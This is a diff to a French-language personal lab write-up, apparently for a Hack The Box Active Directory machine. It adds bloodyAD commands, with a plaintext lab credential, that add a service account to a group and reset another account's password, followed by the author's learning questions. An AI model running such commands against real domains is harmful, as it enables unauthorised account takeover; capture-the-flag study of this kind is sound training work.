@@ -221,6 +221,12 @@ Résultat : accès refusé → pas membre de *Remote Management Users*.
 Une escalade AD classique n'est pas possible.\
 Il faudra exploiter un **service**, une **application**, ou
 **monitoring_svc**.
+```
+[Nov 14, 2025 - 19:26:16 (CET)] exegol-htb-vpn /workspace # bloodyAD --host 10.10.11.93 -u WEB_SVC -p 'dksehdgh712!@#' -d nanocorp.htb add groupMember "IT_Support" "WEB_SVC"
+
+[+] WEB_SVC added to IT_Support
+```
+
 
 ```
 [Nov 14, 2025 - 19:07:38 (CET)] exegol-htb-vpn /workspace # bloodyAD --host 10.10.11.93 -u WEB_SVC -p 'dksehdgh712!@#' -d nanocorp.htb set password "monitoring_svc" "Password1234"
@@ -228,3 +234,25 @@ Il faudra exploiter un **service**, une **application**, ou
 [+] Password changed successfully!
 
 ```
+
+
+Questions:
+
+Comment tu sais que t as les droitsd d ajouter ton user au groupe IT_Support
+
+Questions sur ce schéma:
+![[IMG-20251114193653159.png]]
+
+
+ADMR a quoi ça sert?
+
+Comment vérifier que ton mdp est bien changé?
+
+estce ce que ces commandes sont bonnes:
+[Nov 14, 2025 - 19:40:21 (CET)] exegol-htb-vpn /workspace # bloodyAD --host 10.10.11.93 -u WEB_SVC -p 'dksehdgh712!@#' -d nanocorp.htb add groupMember "IT_Support" "WEB_SVC"
+[+] WEB_SVC added to IT_Support
+[Nov 14, 2025 - 19:41:20 (CET)] exegol-htb-vpn /workspace # bloodyAD --host 10.10.11.93 -u WEB_SVC -p 'dksehdgh712!@#' -d nanocorp.htb set password "monitoring_svc" "Test1234"
+[+] Password changed successfully!
+[Nov 14, 2025 - 19:41:28 (CET)] exegol-htb-vpn /workspace # 
+
+ bloodhound fonctionne que lorsqu on a des acces sur l annulaire ldap?
